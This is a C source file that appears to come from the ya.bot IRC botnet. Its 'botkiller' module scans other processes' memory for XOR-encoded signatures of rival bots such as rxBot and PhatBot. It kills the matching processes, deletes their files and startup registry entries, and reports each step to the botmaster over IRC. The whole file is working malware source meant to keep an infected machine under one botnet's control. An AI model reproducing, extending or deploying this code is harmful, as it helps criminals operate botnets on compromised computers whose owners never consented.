/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_BOTKILLER
DWORD WINAPI botkiller_main(LPVOID param)
{
	char szSignature[LOWBUF];
	CRITICAL_SECTION ct;
	DWORD dwTime;
	HANDLE hProcess;
	int nBotsKilled = 0, nBotsRemoved = 0;
	PROCESSENTRY32 pe32;
	SBotKiller s_bk = *((SBotKiller *)param);

#ifndef NO_DEBUG
		debug_print("Killing bots, botkiller_main()");
#endif

		InitializeCriticalSection(&ct);
		hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcess, &pe32))
	{
			CloseHandle(hProcess);
			DeleteCriticalSection(&ct);
		if ((!s_bk.m_bSilent) && (s_bk.m_bVerbose))
				irc_message(s_bk.m_bsock, s_bk.m_szAction, s_bk.m_szDestination,
						(char *)string_botkillerfailed,
						CRED, string_replybotkiller, CEND, string_replydotbot);
			thread_remove(THREAD_BOTKILLER);
			return 0;
	}
	if ((!s_bk.m_bSilent) && (s_bk.m_bVerbose))
			irc_message(s_bk.m_bsock, s_bk.m_szAction, s_bk.m_szDestination,
					(char *)string_botkillerstarted,
					CBLUE, string_replybotkiller, CEND, string_replydotbot);
		dwTime = GetTickCount();
	while (Process32Next(hProcess, &pe32))
	{
		if (GetCurrentProcessId() != pe32.th32ProcessID)
		{
				EnterCriticalSection(&ct);
			if (pe32.cntThreads >= 64)
			{
/*				if (process_killpid(pe32.th32ProcessID))
				{
						nBotsKilled++;
						Sleep(FLOOD_DELAY);
					if (!s_bk.m_bSilent)
							irc_message(s_bk.m_bsock, s_bk.m_szAction, s_bk.m_szDestination,
									(char *)string_botkillerkilledprocess,
									CGREEN, string_replybotkiller, CEND, string_replydotbot,
									CBLUE, CEND, pe32.szExeFile,
									CBLUE, CEND, "");
						Sleep(FLOOD_DELAY);
						nBotsRemoved += botkiller_removebot(pe32.szExeFile, &s_bk);
				}*/
			}
			else if (botkiller_memscan(pe32.th32ProcessID, szSignature, sizeof(szSignature) - 1))
			{
				if (process_killpid(pe32.th32ProcessID))
				{
						nBotsKilled++;
						Sleep(FLOOD_DELAY);
					if (!s_bk.m_bSilent)
							irc_message(s_bk.m_bsock, s_bk.m_szAction, s_bk.m_szDestination,
									(char *)string_botkillerkilledprocess,
									CGREEN, string_replybotkiller, CEND, string_replydotbot,
									CBLUE, CEND, pe32.szExeFile,
									CBLUE, CEND, szSignature);
						Sleep(FLOOD_DELAY);
						nBotsRemoved += botkiller_removebot(pe32.szExeFile, &s_bk);
				}
			}
				LeaveCriticalSection(&ct);
		}
	}
		CloseHandle(hProcess);
		DeleteCriticalSection(&ct);
	if ((!s_bk.m_bSilent) && (s_bk.m_bVerbose))
			irc_message(s_bk.m_bsock, s_bk.m_szAction, s_bk.m_szDestination,
					(char *)string_botkillerfinished,
					CBLUE, string_replybotkiller, CEND, string_replydotbot,
					CBLUE, CEND, (GetTickCount() - dwTime) / 60000,
					CBLUE, CEND, nBotsKilled,
					CBLUE, CEND, nBotsRemoved,
					CBLUE, CEND, pe32.szExeFile);
		thread_remove(THREAD_BOTKILLER);
		return 0;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Bjoern Stickler
//http://intex.ath.cx/
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool botkiller_memscan(DWORD dwPID, char *pszBuffer, DWORD dwSize)
{
	char *rgpszSignatureList[] =
	{
			"\xA8\xAD\xBF\xBA\xAA\xA8\xA7", //advscan (rxBot + mods)
			"\xAB\xA6\xBD\xE1\xBA\xE0\xE9\xAF\xA6\xBC\xA7\xAD\xE9\xBE\xA0\xBD\xA1\xE9\xBA\xBD\xBB"
			"\xA0\xA7\xAE", //bot(s) found with string (dETOX)
			"\xBA\xAA\xA8\xA7\xE7\xBA\xBD\xA6\xB9", //scan.stop (AgoBot/dopebot/PhatBot)
			NULL
	};
	BYTE byBuffer[0x1000];
	DWORD dwAddress = 0, dwBaseAddress, dwOffset = 0, dwRead;
	HANDLE hProcess, hToken;
	int i;

#ifndef NO_DEBUG
		debug_print("Searching process memory, botkiller_scanner()");
#endif

	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
			return FALSE;
		hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE, dwPID);
	if (!hProcess)
	{
			CloseHandle(hToken);
			return FALSE;
	}
	for (i = 0; i < ARRAYSIZE(rgpszSignatureList); i++)
	{
		if (!rgpszSignatureList[i])
				break;
			crypto_xor(rgpszSignatureList[i], xorkey);
		for (dwBaseAddress = 0; dwBaseAddress < 0x80000000; dwBaseAddress += 0x1000)
		{
				memset(byBuffer, 0, 0x1000);
			if (ReadProcessMemory(hProcess, (void *)dwBaseAddress, byBuffer, 0x1000, &dwRead))
			{
				while ((dwAddress = (DWORD)memmem((const void *)(byBuffer + dwOffset),
							(const void *)rgpszSignatureList[i],
							0x1000 - dwOffset,
							strlen(rgpszSignatureList[i]))))
				{
						dwOffset = dwAddress - (DWORD)byBuffer;
					if ((dwAddress != 0) && (dwOffset != 0))
					{
							strncpy(pszBuffer, rgpszSignatureList[i], dwSize);
							crypto_xor(rgpszSignatureList[i], xorkey);
							CloseHandle(hToken);
							CloseHandle(hProcess);
							return TRUE;
					}
				}
			}
		}
			crypto_xor(rgpszSignatureList[i], xorkey);
	}
		CloseHandle(hToken);
		CloseHandle(hProcess);
		return FALSE;
}

int botkiller_removebot(char *pszFileName, LPVOID param)
{
	char szFilePath[MAX_PATH], szValueData[MEDBUF], szValueName[MEDBUF];
	DWORD dwIndex, dwSize1, dwSize2, dwValueType;
	HKEY hKey, rk;
	int i, nReturn = 0;
	SBotKiller s_bk = *((SBotKiller *)param);

#ifndef NO_DEBUG
		debug_print("Removing bot, botkiller_removebot()");
#endif

		memset(szFilePath, 0, sizeof(szFilePath));
		GetWindowsDirectory(szFilePath, sizeof(szFilePath) - 1);
		strncat(szFilePath,
				"\\",
				(sizeof(szFilePath) - strlen(szFilePath)) - 1);
		strncat(szFilePath,
				pszFileName,
				(sizeof(szFilePath) - strlen(szFilePath)) - 1);
	if (file_delete(szFilePath))
	{
		if (!s_bk.m_bSilent)
				irc_message(s_bk.m_bsock, s_bk.m_szAction, s_bk.m_szDestination,
						(char *)string_botkillerdeletedfile,
						CGREEN, string_replybotkiller, CEND, string_replydotbot,
						CBLUE, CEND, szFilePath);
			nReturn++;
	}
		memset(szFilePath, 0, sizeof(szFilePath));
		GetSystemDirectory(szFilePath, sizeof(szFilePath) - 1);
		strncat(szFilePath,
				"\\",
				(sizeof(szFilePath) - strlen(szFilePath)) - 1);
		strncat(szFilePath,
				pszFileName,
				(sizeof(szFilePath) - strlen(szFilePath)) - 1);
	if (file_delete(szFilePath))
	{
		if (!s_bk.m_bSilent)
				irc_message(s_bk.m_bsock, s_bk.m_szAction, s_bk.m_szDestination,
						(char *)string_botkillerdeletedfile,
						CGREEN, string_replybotkiller, CEND, string_replydotbot,
						CBLUE, CEND, szFilePath);
			nReturn++;
	}
	for (i = 0; i < 2; i++)
	{
		if (!i)
				hKey = HKEY_CURRENT_USER;
		else
				hKey = HKEY_LOCAL_MACHINE;
		if (RegOpenKeyEx(hKey,
					string_installregistrystartup,
					0,
					KEY_ALL_ACCESS,
					&rk) == ERROR_SUCCESS)
		{
				dwIndex = 0;
				dwSize1 = MEDBUF - 1;
				dwSize2 = MEDBUF - 1;
			while (RegEnumValue(rk,
						dwIndex,
						szValueName,
						&dwSize1,
						NULL,
						&dwValueType,
						(BYTE *)&szValueData,
						&dwSize2) == ERROR_SUCCESS)
			{
				if (dwValueType == REG_SZ)
				{
					if (stristr(szValueData, pszFileName))
					{
						if (RegDeleteValue(rk, szValueName) == ERROR_SUCCESS)
						{
							if (!s_bk.m_bSilent)
									irc_message(s_bk.m_bsock, s_bk.m_szAction, s_bk.m_szDestination,
											(char *)string_botkillerdeletedregistryentry,
											CGREEN, string_replybotkiller, CEND, string_replydotbot,
											CBLUE, CEND, szValueName);
								nReturn++;
						}
					}
				}
					dwSize1 = MEDBUF - 1;
					dwSize2 = MEDBUF - 1;
					dwIndex++;
			}
		}
	}
		return nReturn;
}
#endif